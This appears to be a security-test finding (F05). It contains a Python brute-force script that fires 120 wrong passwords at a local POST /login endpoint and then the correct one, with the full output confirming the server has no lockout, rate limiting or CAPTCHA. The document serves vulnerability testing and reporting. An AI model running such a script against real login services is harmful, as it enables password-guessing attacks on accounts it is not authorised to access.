F05 - Brute force / no lockout against POST /login
Captured 2026-10-10

=== Script: f05_bruteforce.py ===
"""
F05 - Brute force / no lockout test against POST /login
Sends 100+ wrong-password attempts for testUser1, then the correct password.
"""
import time
import urllib.request
import json

BASE = "http://127.0.0.1:8000"
USERNAME = "testUser1"
CORRECT_PASSWORD = "testUser1"
ATTEMPTS = 120

def login(username, password):
    data = json.dumps({"username": username, "password": password}).encode()
    req = urllib.request.Request(
        f"{BASE}/login",
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

def main():
    start = time.time()
    statuses = []
    for i in range(1, ATTEMPTS + 1):
        wrong_pw = f"wrongpass{i}"
        status, body = login(USERNAME, wrong_pw)
        statuses.append(status)
        print(f"attempt {i:3d}: password={wrong_pw!r:16s} -> HTTP {status}  {body}")

    elapsed = time.time() - start
    print()
    print(f"--- {ATTEMPTS} wrong-password attempts completed in {elapsed:.2f}s "
          f"({elapsed/ATTEMPTS*1000:.1f} ms/req avg) ---")
    non_401 = [s for s in statuses if s != 401]
    print(f"Status codes seen: {sorted(set(statuses))}")
    print(f"Attempts that were NOT 401: {len(non_401)} (expected 0 - no lockout, "
          f"no CAPTCHA, no rate limit triggered)")

    print()
    print("--- Now trying the CORRECT password ---")
    status, body = login(USERNAME, CORRECT_PASSWORD)
    print(f"correct password -> HTTP {status}  {body}")
    if status == 200:
        print()
        print("CONFIRMED: after 120 consecutive wrong-password attempts in "
              f"{elapsed:.2f}s with zero throttling, the correct password still "
              "logs in immediately. No account lockout, no rate limiting, no "
              "CAPTCHA, no delay of any kind.")
    else:
        print("UNEXPECTED: correct password did not succeed - investigate.")

if __name__ == "__main__":
    main()

=== Output ===
attempt   1: password='wrongpass1'     -> HTTP 401  {"detail":"Invalid username or password"}
attempt   2: password='wrongpass2'     -> HTTP 401  {"detail":"Invalid username or password"}
attempt   3: password='wrongpass3'     -> HTTP 401  {"detail":"Invalid username or password"}
attempt   4: password='wrongpass4'     -> HTTP 401  {"detail":"Invalid username or password"}
attempt   5: password='wrongpass5'     -> HTTP 401  {"detail":"Invalid username or password"}
attempt   6: password='wrongpass6'     -> HTTP 401  {"detail":"Invalid username or password"}
attempt   7: password='wrongpass7'     -> HTTP 401  {"detail":"Invalid username or password"}
attempt   8: password='wrongpass8'     -> HTTP 401  {"detail":"Invalid username or password"}
attempt   9: password='wrongpass9'     -> HTTP 401  {"detail":"Invalid username or password"}
attempt  10: password='wrongpass10'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  11: password='wrongpass11'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  12: password='wrongpass12'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  13: password='wrongpass13'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  14: password='wrongpass14'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  15: password='wrongpass15'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  16: password='wrongpass16'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  17: password='wrongpass17'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  18: password='wrongpass18'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  19: password='wrongpass19'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  20: password='wrongpass20'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  21: password='wrongpass21'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  22: password='wrongpass22'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  23: password='wrongpass23'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  24: password='wrongpass24'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  25: password='wrongpass25'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  26: password='wrongpass26'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  27: password='wrongpass27'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  28: password='wrongpass28'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  29: password='wrongpass29'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  30: password='wrongpass30'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  31: password='wrongpass31'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  32: password='wrongpass32'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  33: password='wrongpass33'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  34: password='wrongpass34'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  35: password='wrongpass35'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  36: password='wrongpass36'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  37: password='wrongpass37'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  38: password='wrongpass38'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  39: password='wrongpass39'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  40: password='wrongpass40'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  41: password='wrongpass41'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  42: password='wrongpass42'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  43: password='wrongpass43'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  44: password='wrongpass44'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  45: password='wrongpass45'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  46: password='wrongpass46'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  47: password='wrongpass47'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  48: password='wrongpass48'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  49: password='wrongpass49'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  50: password='wrongpass50'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  51: password='wrongpass51'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  52: password='wrongpass52'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  53: password='wrongpass53'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  54: password='wrongpass54'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  55: password='wrongpass55'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  56: password='wrongpass56'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  57: password='wrongpass57'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  58: password='wrongpass58'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  59: password='wrongpass59'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  60: password='wrongpass60'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  61: password='wrongpass61'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  62: password='wrongpass62'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  63: password='wrongpass63'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  64: password='wrongpass64'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  65: password='wrongpass65'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  66: password='wrongpass66'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  67: password='wrongpass67'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  68: password='wrongpass68'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  69: password='wrongpass69'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  70: password='wrongpass70'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  71: password='wrongpass71'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  72: password='wrongpass72'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  73: password='wrongpass73'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  74: password='wrongpass74'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  75: password='wrongpass75'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  76: password='wrongpass76'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  77: password='wrongpass77'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  78: password='wrongpass78'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  79: password='wrongpass79'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  80: password='wrongpass80'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  81: password='wrongpass81'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  82: password='wrongpass82'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  83: password='wrongpass83'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  84: password='wrongpass84'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  85: password='wrongpass85'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  86: password='wrongpass86'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  87: password='wrongpass87'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  88: password='wrongpass88'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  89: password='wrongpass89'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  90: password='wrongpass90'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  91: password='wrongpass91'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  92: password='wrongpass92'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  93: password='wrongpass93'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  94: password='wrongpass94'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  95: password='wrongpass95'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  96: password='wrongpass96'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  97: password='wrongpass97'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  98: password='wrongpass98'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt  99: password='wrongpass99'    -> HTTP 401  {"detail":"Invalid username or password"}
attempt 100: password='wrongpass100'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 101: password='wrongpass101'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 102: password='wrongpass102'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 103: password='wrongpass103'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 104: password='wrongpass104'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 105: password='wrongpass105'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 106: password='wrongpass106'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 107: password='wrongpass107'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 108: password='wrongpass108'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 109: password='wrongpass109'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 110: password='wrongpass110'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 111: password='wrongpass111'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 112: password='wrongpass112'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 113: password='wrongpass113'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 114: password='wrongpass114'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 115: password='wrongpass115'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 116: password='wrongpass116'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 117: password='wrongpass117'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 118: password='wrongpass118'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 119: password='wrongpass119'   -> HTTP 401  {"detail":"Invalid username or password"}
attempt 120: password='wrongpass120'   -> HTTP 401  {"detail":"Invalid username or password"}

--- 120 wrong-password attempts completed in 4.76s (39.7 ms/req avg) ---
Status codes seen: [401]
Attempts that were NOT 401: 0 (expected 0 - no lockout, no CAPTCHA, no rate limit triggered)

--- Now trying the CORRECT password ---
correct password -> HTTP 200  {"message":"Login successful for testUser1","user_id":"6ac17329310ec3274894717b","username":"testUser1"}

CONFIRMED: after 120 consecutive wrong-password attempts in 4.76s with zero throttling, the correct password still logs in immediately. No account lockout, no rate limiting, no CAPTCHA, no delay of any kind.
